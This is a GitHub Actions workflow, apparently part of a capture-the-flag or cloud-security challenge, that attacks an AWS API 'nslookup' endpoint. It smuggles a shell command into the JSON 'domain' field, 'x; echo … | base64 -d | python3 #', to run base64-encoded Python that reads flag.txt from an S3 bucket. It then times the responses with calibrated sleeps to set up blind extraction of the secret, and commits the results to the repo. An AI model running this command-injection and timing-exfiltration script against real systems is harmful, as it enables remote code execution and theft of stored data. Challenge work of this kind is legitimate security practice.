name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          token: ${{ github.token }}

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Calibrate and verify flag
        run: |
          B64_CAL0="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCgwKQ=="
          B64_CAL4="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCg0KQ=="
          B64_CAL8="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCg4KQ=="
          B64_CMP=""
          B64_ANALYZE=""

          touch calibrate.txt

          run_timed() {
            local name="$1" b64="$2"
            INJECT="x; echo $b64 | base64 -d | python3 #"
            python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
            START=$(date +%s%N)
            curl -s -o /dev/null -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
              -H "Content-Type: application/json" -d @payload.json
            END=$(date +%s%N)
            MS=$(( (END - START) / 1000000 ))
            echo "$name ${MS}ms" | tee -a calibrate.txt
          }

          run_timed "cal_sleep0" "$B64_CAL0"
          run_timed "cal_sleep4" "$B64_CAL4"
          run_timed "cal_sleep8" "$B64_CAL8"
          run_timed "full_flag_cmp" "$B64_CMP"
          run_timed "cal_sleep0_2" "$B64_CAL0"
          run_timed "cal_sleep4_2" "$B64_CAL4"

          echo "=== CALIBRATION RESULTS ==="
          cat calibrate.txt
          echo "$B64_ANALYZE" | base64 -d | python3

      - name: Commit calibration results
        run: |
          git config user.email "bot@github-actions"
          git config user.name "GitHub Actions"
          git add calibrate.txt
          git commit -m "calibration + flag verify results [skip ci]" || echo "Nothing to commit"
          git push origin corgi
